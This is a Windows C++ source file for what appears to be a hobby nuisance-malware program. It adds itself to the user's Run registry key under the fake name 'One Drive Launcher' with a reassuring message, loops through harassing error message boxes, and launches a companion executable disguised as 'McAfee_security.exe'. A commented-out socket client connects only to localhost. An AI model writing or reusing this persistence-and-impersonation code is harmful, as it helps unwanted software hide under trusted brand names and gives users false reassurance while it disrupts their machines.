#include <Windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <string>
//#include <winsock2.h>

//#pragma comment(lib, "ws2_32.lib")


#define PORT 8765
using namespace std;


std::string fromWcharToString(std::wstring wstr)
{
	// Calculating the length of the multibyte string
	size_t len = wcstombs(nullptr, wstr.c_str(), 0) + 1;

	// Creating a buffer to hold the multibyte string
	char* buffer = new char[len];

	// Converting wstring to string
	wcstombs(buffer, wstr.c_str(), len);

	// Creating std::string from char buffer
	std::string str(buffer);

	// Cleaning up the buffer
	delete[] buffer;
	return str;
}

// Function to get the current executable's path - return STRING
std::string GetAppPath() {
	WCHAR path[MAX_PATH];  // Use WCHAR for wide character array
	GetModuleFileNameW(NULL, path, MAX_PATH);  // Retrieves the full path of the executable in wide characters
	std::wstring wpath = std::wstring(path);
	// convert to string
	return fromWcharToString(wpath);  // Return as std::wstring (wide string)
}

// Function to get the current executable's path - return WCHAR
std::wstring GetAppPathWchar() {
	WCHAR path[MAX_PATH];  // Use WCHAR for wide character array
	GetModuleFileNameW(NULL, path, MAX_PATH);  // Retrieves the full path of the executable in wide characters
	return std::wstring(path);  // Return as std::wstring (wide string)
}

// add this program to auto run
void static AddToStartup() {
	HKEY hKey;
	const WCHAR* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	const WCHAR* appName = L"One Drive Launcher";
	std::wstring appPath = GetAppPathWchar();

	// Open the registry key
	if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		// Set the value in the registry
		RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(WCHAR));
		RegCloseKey(hKey);
		std::cout << "Great! your computer now is in safe hands." << std::endl;
	}
	else {
		std::cout << "Failed to open registry key!" << std::endl;
	}
}

int makeMutex(string mtxName)
{
	// need to work on it, how to return the handle
	LPCSTR mutexName = mtxName.c_str();

	// Create the named mutex
	HANDLE hMutex = CreateMutexA(NULL, FALSE, mutexName);

	// Check if the mutex already exists
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		// Mutex already exists, meaning another instance is running
		std::cout << "The software is already running. Exiting...\n";
		// Exit the process to prevent further execution or reinstallation
		return 0;
	}
	return 1;
}

std::string makePurePath(std::string pre_path)
{
	string pure_path;
	int len = strlen(pre_path.c_str()) - 21;
	pure_path = pre_path.substr(0, len);
	return pure_path;
}

int makeProcess(PROCESS_INFORMATION* pi, const char* exe_path)
{
	int id = 8200;
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(pi, sizeof(pi));
	int len = strlen(exe_path) + 3;
	char* my_exe = (char*)malloc(len * sizeof(CHAR));
	sprintf_s(my_exe, len, "%s %c", exe_path, id);


	CreateProcessA(
		NULL,
		my_exe, // Command line : exe path + arg 
		NULL, // Process handle not inheritable
		NULL, // Thread handle not inheritable
		FALSE, // Set handle inheritance to FALSE
		0, // No creation flags
		NULL, // Use parent's environment block
		NULL, // Use parent's starting directory
		&si, // Pointer to STARTUPINFO structure
		pi); // Pointer to PROCESS_INFORMATION structure
	printf("process is running.\n");  //, id - '0'


	free(my_exe);
	return 0;
}

// create annoying msg boxes im repeat
DWORD WINAPI msg_boxs(LPVOID lparam)
{
	while (true)
	{
		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONERROR);
		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_HELP);
		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_CANCELTRYCONTINUE);
		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONWARNING);
		this_thread::sleep_for(std::chrono::milliseconds(9000));
	}
	return 1;
}

/*
int makeClient()
{
	WSADATA wsaData;
	SOCKET sock;
	struct sockaddr_in serverAddr;
	char buffer[1024] = { 0 };
	const char* hello = "Hello from client";

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "Failed to initialize Winsock\n";
		return -1;
	}

	// Create socket
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		std::cerr << "Socket creation failed\n";
		WSACleanup();
		return -1;
	}

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT);

	// Convert IPv4 address from text to binary form
	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (serverAddr.sin_addr.s_addr == INADDR_NONE) {
		std::cerr << "Invalid address\n";
		closesocket(sock);
		WSACleanup();
		return -1;
	}

	// Connect to server
	if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
		std::cerr << "Connection Failed\n";
		closesocket(sock);
		WSACleanup();
		return -1;
	}

	// Send data to server
	send(sock, hello, strlen(hello), 0);
	std::cout << "Hello message sent\n";

	// Receive response from server
	recv(sock, buffer, sizeof(buffer), 0);
	std::cout << "Server: " << buffer << std::endl;
	if (buffer == "Hello from server")
		return 0;

	// Close socket
	closesocket(sock);
	WSACleanup();
	return 0;
}
*/
HANDLE createEvent(void)
{
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("SuccessEvent"));
	if (hEvent == NULL) {
		std::cerr << "CreateEvent failed with error: " << GetLastError() << std::endl;
		return 0;
	}
	return hEvent;
}



//int main()
INT WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	// add myself to autorun
	AddToStartup();

	//create event
	HANDLE hEvent = nullptr;
	hEvent = createEvent();

	// launch thread of msg boxes.
	HANDLE msg_thread;
	msg_thread = CreateThread(NULL, NULL, msg_boxs, NULL, 0, NULL);

	// create mutex
	HANDLE trivia_mutex;
	trivia_mutex = CreateMutex(
		NULL,              // default security attributes
		FALSE,             // initially not owned
		NULL);             // unnamed mutex

	// launch trivia part.. this proccess will launch the console.
	string my_path = GetAppPath();
	string pure_path = makePurePath(my_path);
	string trivia_path_s = pure_path + "McAfee_security.exe";
	PROCESS_INFORMATION trivia_launcher;
	makeProcess(&trivia_launcher, trivia_path_s.c_str());

	// launch 
	//if (hEvent == 0)
		//TerminateThread(msg_thread, 0);

	WaitForSingleObject(hEvent, INFINITE);
	TerminateThread(msg_thread, 0);
	CloseHandle(hEvent);

	int con = 0;
	while (con < 99999)
	{
		//this_thread::sleep_for(std::chrono::milliseconds(30000));
		con++;
	}
}
